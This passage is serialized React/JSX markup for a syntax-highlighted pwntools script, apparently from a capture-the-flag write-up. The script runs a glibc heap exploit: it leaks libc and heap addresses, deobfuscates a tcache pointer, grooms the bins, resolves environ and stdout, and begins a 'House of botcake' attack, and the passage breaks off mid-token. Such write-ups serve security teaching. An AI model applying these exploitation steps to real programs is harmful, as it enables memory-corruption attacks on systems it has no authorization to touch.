punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"show\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"SHOWING: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"> \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:'\"3\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"idx: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvline\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Make two large chunks\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1350\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1350\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Free the first one so bk = main_arena in libc\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    resp \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# parse the libc address in little-endian\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    libcaddr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"resp\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Use offsets found in gdb to compute libc base\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libcaddr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f7c10419ce0\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7f7c10200000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Libc Leak: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#Grab some blocks\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#excess\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#excess\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Place them into the tcache\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#This printed out a heap address\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" show\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#Parse, deobfuscate, and set heap base.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    addr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"int\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    heap_leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" deobfuscate\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"addr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# seccomp actually alloc'd over a page of memory,\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# so base was -0x1000 from what I got.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap_leak \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x1000\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Heap Base: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Cleaning tcaches + smallbins\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x60\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x70\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x80\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xc0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xe0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"11\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x10\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"15\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x30\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'A'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Get environ and stdout\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'environ'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    stdout \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"symbols\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'_IO_2_1_stdout_'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# House of botcake\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Allocate 7 blocks of size 0x200, we\\u2019ll free them later\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# We can\\u2019t leak them as before, so place them into our mem array properly\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"in\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"range\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"7\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"9\"}),(0,n.jsx)(e.span,{className:\"token 